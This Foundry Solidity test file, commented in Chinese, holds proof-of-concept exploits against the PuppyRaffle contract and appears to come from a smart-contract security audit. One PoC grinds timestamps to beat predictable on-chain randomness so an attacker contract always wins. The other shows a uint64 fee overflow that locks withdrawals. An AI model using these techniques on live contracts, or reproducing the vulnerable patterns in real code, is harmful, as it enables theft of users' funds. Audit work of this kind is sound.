// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/// @notice PoC #2 弱随机数 + PoC #3 totalFees uint64 溢出
contract WeaknessesPoCTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    // ---------------------------------------------------------------------
    // PoC #2：selectWinner 的"随机"完全可预测 —— 攻击者可保证自己中奖
    // winnerIndex = keccak(msg.sender, block.timestamp, block.difficulty) % n
    // 三个输入在调用时全部已知/可控，攻击者只在对自己有利的区块调用即可。
    // ---------------------------------------------------------------------
    function test_weakRandomness_attackerAlwaysWins() public {
        PredictAttacker attacker = new PredictAttacker(puppyRaffle);

        address[] memory players = new address[](4);
        players[0] = address(attacker); // 攻击者 = index 0
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        // 用和合约一模一样的公式，grind 一个让 index==0(攻击者)的时间戳
        uint256 start = block.timestamp + duration + 1; // 必须等抽奖结束
        uint256 winT;
        bool found;
        for (uint256 k = 0; k < 256; k++) {
            uint256 tt = start + k;
            uint256 idx = uint256(
                keccak256(abi.encodePacked(address(attacker), tt, block.difficulty))
            ) % 4;
            if (idx == 0) {
                winT = tt;
                found = true;
                break;
            }
        }
        require(found, "no winning block in window");

        vm.warp(winT);
        attacker.win(); // 由攻击者合约调用 -> msg.sender = attacker

        assertEq(puppyRaffle.previousWinner(), address(attacker), "attacker guaranteed the win");
    }

    // ---------------------------------------------------------------------
    // PoC #3：totalFees 是 uint64，0.7.6 无溢出检查。
    // 玩家够多时 20% 费用 > uint64.max，uint64(fee) 被截断，
    // 费用会计被严重低计，且 withdrawFees 因 balance != totalFees 被永久锁死。
    // ---------------------------------------------------------------------
    function test_overflow_totalFeesTruncatedAndFeesLocked() public {
        uint256 n = 100; // 100 * 1e18 * 20% = 20e18 fee > uint64.max(≈1.845e19)
        address[] memory players = new address[](n);
        for (uint256 i = 0; i < n; i++) {
            players[i] = address(uint160(1000 + i)); // 避开预编译地址
        }
        puppyRaffle.enterRaffle{value: entranceFee * n}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        uint256 trueFee = (n * entranceFee * 20) / 100; // 应得 20 ETH
        uint256 recorded = puppyRaffle.totalFees(); // uint64，被截断

        emit log_named_uint("true fee (wei)     ", trueFee);
        emit log_named_uint("recorded totalFees ", recorded);

        // 记账被严重低计
        assertLt(recorded, trueFee);
        // 合约实际持有 trueFee 的费用，但 totalFees 对不上 -> withdrawFees 永久 revert
        assertEq(address(puppyRaffle).balance, trueFee, "contract holds full fee");
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

contract PredictAttacker is IERC721Receiver {
    PuppyRaffle public raffle;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }

    function win() external {
        raffle.selectWinner();
    }

    function onERC721Received(address, address, uint256, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
